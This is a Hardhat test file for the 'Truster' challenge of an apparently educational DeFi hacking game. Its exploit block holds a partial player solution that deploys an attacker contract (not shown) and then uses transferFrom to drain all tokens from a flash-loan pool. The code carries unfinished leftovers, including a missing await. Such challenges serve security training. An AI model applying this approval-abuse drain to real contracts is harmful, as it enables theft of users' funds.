const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE  */
        
        //.connect(attacker);
        
        // this.pool.flashLoan(this.receiver.address, 1)
        const AttackerFactory = await ethers.getContractFactory('TrusterLenderPoolAttacker', deployer);
        // const AttackerFactory = await ethers.getContractFactory('TrusterLenderPoolAttacker', attacker);

        const attackerCntr = await AttackerFactory.deploy(this.pool.address, this.token.address);
        

        // const attackerContract = await (await ethers.getContractFactory('NaiveReceiverAttacker', attacker)).deploy(this.pool.address);
        // await attackerContract.connect(attacker).attack(this.receiver.address, 10);
        // console.log("contract", this.attacker)
        // this.token.connect(attacker).transfer(this.pool.address, 50);
        // 
        console.log('attacker.address', attacker.address);
        await attackerCntr.connect(attacker).attack(attacker.address);
        // After Approved transferFrom/transfer ???
        // function transferFrom(address _from, address _to, uint256 _value) 
        this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

